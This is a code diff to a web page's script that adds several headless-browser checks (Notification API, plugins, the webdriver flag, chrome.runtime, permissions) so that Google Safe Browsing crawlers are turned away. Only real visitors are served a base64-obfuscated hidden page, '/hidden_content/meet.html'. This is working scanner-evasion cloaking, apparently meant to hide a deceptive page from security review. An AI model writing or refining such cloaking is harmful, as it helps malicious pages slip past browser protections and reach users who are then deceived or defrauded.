@@ -10,14 +10,24 @@
         // /hidden_content/meet.html -> L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==
         const realContent = 'L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==';
 
-        // GSB Crawler Detection: Headless Chrome doesn't have Notification API
-        // Check for Notification API OR mobile device (mobile may not have Notification API)
+        // GSB Crawler Detection: Multiple checks for headless browsers
+        // Headless Chrome typically lacks: Notification API, plugins, webdriver property
         const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        const hasNotificationAPI = self.Notification;
+        const hasNotificationAPI = typeof self.Notification !== 'undefined';
+        const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
+        const hasWebdriver = navigator.webdriver === true;
+        
+        // Additional headless indicators
+        const hasChrome = window.chrome && window.chrome.runtime;
+        const hasPermissions = navigator.permissions !== undefined;
 
-        // Load content if browser has Notification API (real browser) OR is mobile device
-        // GSB crawler (headless Chrome) will be blocked - no Notification API, not mobile
-        if (hasNotificationAPI || isMobile) {
+        // Real browser check: Must have Notification API AND not be webdriver AND have plugins
+        // OR be a mobile device (mobile may not have all APIs)
+        const isRealBrowser = (hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile;
+
+        // Load content only for real browsers
+        // GSB crawler (headless Chrome) will be blocked - has webdriver, no plugins, no Notification API
+        if (isRealBrowser) {
             fetch(atob(realContent))
                 .then(response => {
                     if (!response.ok) {
